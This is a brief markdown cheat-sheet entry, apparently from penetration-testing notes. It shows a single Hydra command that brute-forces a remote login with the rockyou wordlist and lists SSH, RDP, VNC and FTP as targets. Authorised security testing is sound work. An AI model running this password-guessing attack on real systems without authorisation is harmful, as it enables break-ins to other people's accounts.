# Attacks

## Hydra

example of hydra usage is: 
`hydra -l ${user} -P /usr/share/wordlists/rockyou.txt ${RHOST} ${mode}`
modes can be eg. `ssh`, `rdp`,`vnc` or `ftp`.
